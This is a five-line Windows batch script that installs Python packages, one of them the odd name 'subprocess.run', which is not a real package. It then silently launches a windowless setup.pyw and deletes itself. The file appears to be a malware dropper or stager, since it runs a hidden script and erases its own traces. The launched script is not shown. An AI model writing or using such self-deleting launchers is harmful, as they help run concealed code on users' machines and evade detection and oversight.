python -m pip install pywin32 requests subprocess.run winshell
start setup.pyw
call :deleteSelf&exit /b
:deleteSelf
start /b "" cmd /c del "%~f0"&exit /b